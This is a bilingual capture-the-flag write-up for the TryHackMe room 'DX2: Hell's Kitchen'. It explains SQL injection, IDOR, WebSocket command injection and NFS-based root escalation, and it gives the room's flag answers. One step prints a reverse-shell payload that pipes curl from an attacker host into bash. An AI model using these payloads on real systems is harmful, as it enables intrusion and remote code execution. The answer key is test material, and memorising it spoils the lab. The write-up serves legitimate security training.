# DX2_ Hell's Kitchen [HARD]

### Información de la Sala / Room Information

* **Dificultad / Difficulty:** HARD
* **Tipo / Type:** CTF (Premium)
* **Slug:** `dx2hellskitchen`
* **Link:** https://tryhackme.com/room/dx2hellskitchen
* **Sección / Section:** 03 Level Hard
* **Fuente / Source:** Web (tryhackme.com, GitHub thmrevenant/tryhackme, 0xb0b.gitbook.io, jaxafed.github.io, matty69v.app, localnest.xyz)

## Solucionario de Tareas / Task Solutions

> **ES:** Sala Premium de dificultad Hard con una máquina desplegable. Es la secuela de la sala "DX1: Liberty Island" (universo Deus Ex). La cadena de ataque pasa por inyección SQL en la API de un hotel, credenciales robadas de una base SQLite, IDOR en un cliente de correo, inyección de comandos vía WebSocket, pivoteo entre usuarios (gilbert → sandra → jojo) y abuso de NFS para escalar a root.
> **EN:** Premium Hard-difficulty room with a deployable machine. Sequel to "DX1: Liberty Island" (Deus Ex universe). The attack chain goes through SQL injection in a hotel booking API, credentials stolen from a SQLite database, IDOR in a mail client, command injection via WebSocket, user pivoting (gilbert → sandra → jojo), and NFS abuse to escalate to root.

### Task 1 — Investigate the server of an associate

> **ES:** Investiga el servidor de un asociado aparentemente conectado a la NSF. Se despliega la máquina y se responden 3 preguntas (flags Web, User y Root; las de User y Root se generan por instancia desplegada).
> **EN:** Investigate the server of an associate suspected to be connected to the NSF. Deploy the machine and answer 3 questions (Web, User and Root flags; User and Root are generated per deployed instance).

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| What is the Web Flag? | `thm{adb5b797ee0d01a8c052dbee46fbc065e8c52afd}` |
| What is the User Flag? | `<flag_generada_por_instancia>` (en `/home/sandra/user.txt`; se obtiene tras pivotar a `sandra`. No es estática: cambia en cada despliegue. *Reconstruido por web.*) |
| What is the Root Flag? | `<flag_generada_por_instancia>` (en `/root/root.txt`; formato de ejemplo visto en writeups: `thm{7f6[...]d3b}`, redactado por los autores. *Reconstruido por web.*) |

### Task 2 — Credits

> **ES:** Tarea de cierre sin preguntas, con los créditos (autor: Chris Pritchard). No requiere respuesta.
> **EN:** Closing task with no questions, containing credits (author: Chris Pritchard). No answer required.

## Metodología / Methodology

1. **Paso / Step — Reconocimiento / Enumeration:** `nmap -T4 -n -sC -sV -Pn -p- <IP>` revela solo dos puertos web: `80` (hotel "The 'Ton") y `4346` (portal NYComm / NYCCOM.USERS.PUB).
2. **Paso / Step — Análisis de la web (puerto 80):** En `/` y `/new-booking` se analizan `/static/check-rooms.js` y `/static/new-booking.js`. El JS lee la cookie `BOOKING_KEY` y la envía a `/api/booking-info?booking_key=...`.
3. **Paso / Step — Decodificación:** La cookie está codificada en **Base58** y contiene `booking_id:<7 dígitos>`. El endpoint devuelve `not found`.
4. **Paso / Step — Inyección SQL en `/api/booking-info`:** Se confirma SQLi por inyección de la comilla (`bad request`) y comentado con `';-- -` (vuelve a `not found`). Con `ORDER BY` se descubre que la consulta usa **2 columnas** y con `UNION SELECT 1,2` se confirma: `{"room_num":"1","days":"2"}`.
5. **Paso / Step — Fingerprinting de la BD:** `sqlite_version()` → **SQLite 3.42.0**.
6. **Paso / Step — Enumeración del esquema:** `sqlite_schema` / `sqlite_master` devuelve las tablas `email_access`, `reservations`, `bookings_temp`. `email_access` tiene columnas `guest_name`, `email_username`, `email_password`, y contiene la credencial `pdenton:<password>` (login del portal NYComm en el puerto 4346). *(Alternativa: SQLMap con un tamper script de codificación Base58).*
7. **Paso / Step — Login en NYComm y flag Web:** Con las credenciales se accede a `dx2.thm:4346`, endpoint `/mail`. El código fuente minificado revela `/api/message?message_id=<id>` (IDOR) con respuestas en Base64; el mensaje `message_id=3` (usuario JReyes) contiene la **Web Flag**.
8. **Paso / Step — Inyección de comandos vía WebSocket:** El JS abre `ws://<host>/ws` y envía la zona horaria cada segundo; el servidor ejecuta algo como `TZ=<zona> date`. Enviar `Cuba; <cmd>;` permite ejecutar comandos (con límite de longitud del payload).
9. **Paso / Step — Reverse shell:** Dado que la máquina solo puede conectar a puertos `80` y `443` (firewall visible con `sudo ufw status`), se sirve un script con `python3 -m http.server 80` y se captura la shell con `nc -lvnp 443`; payload `UTC;curl <atacante>|bash;`. Shell como **gilbert**.
10. **Paso / Step — Pivoteo a sandra:** En el home de gilbert, el archivo `hotel-jobs.txt` contiene la contraseña de gilbert y una pista; en `/srv/.dad` se encuentra la contraseña de **sandra** → `su sandra`. Lectura de la **User Flag** en `/home/sandra/user.txt`.
11. **Paso / Step — Pivoteo a jojo:** En `/home/sandra/Pictures` hay `boss.jpg` con el password de **jojo** oculto en la imagen (transferencia con `nc -w 3 <atacante> 443 < boss.jpg`). `sudo -l` como jojo permite ejecutar `/usr/sbin/mount.nfs` como root.
12. **Paso / Step — Escalada a root vía NFS:** Se monta un share NFS del atacante (configurado en el puerto 80/443 para sortear el firewall) sobre `/usr/sbin/` de la víctima y se sustituye `/usr/sbin/mount.nfs` por `/bin/sh` (o un binario SUID). Ejecutando `sudo /usr/sbin/mount.nfs` se obtiene una shell **root** y se lee la **Root Flag** en `/root/root.txt`.

### Cadena de ataque / Attack Chain

```
Recon (nmap: 80, 4346)
  -> Puerto 80 (hotel "The 'Ton"): JS -> /api/booking-info?booking_key=...
  -> Base58 decode -> booking_id:<7 dígitos>
  -> SQLi UNION (2 columnas) -> sqlite_version() -> SQLite 3.42.0
  -> Enumerar sqlite_master -> tablas email_access, reservations, bookings_temp
  -> Dumpear email_access -> credencial pdenton:<password>
  -> Login NYComm :4346 -> IDOR /api/message?message_id=3 -> WEB FLAG
  -> WebSocket ws://:4346/ws (TZ=<zona> date) -> Command injection
  -> Reverse shell vía curl|bash (puertos 80/443) -> shell gilbert
  -> /srv/.dad -> password de sandra -> User Flag (/home/sandra/user.txt)
  -> boss.jpg -> password de jojo -> sudo mount.nfs
  -> Montar NFS atacante sobre /usr/sbin -> sustituir mount.nfs -> shell root
  -> Root Flag (/root/root.txt)
```

**Lección:** Las cadenas de ataque reales combinan pequeñas pistas aparentemente inofensivas (JS sin ofuscar, cookies con codificación reversible, notas de usuario, imágenes con secretos, uso de `sudo` no restrictivo con binarios "de confianza"). Nada de la enumeración es trivial: fuentes, endpoints ocultos, credenciales reutilizadas y configuraciones NFS mal aseguradas (`no_root_squash`) pueden convertir un acceso inicial mínimo en una escalada total a root.

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.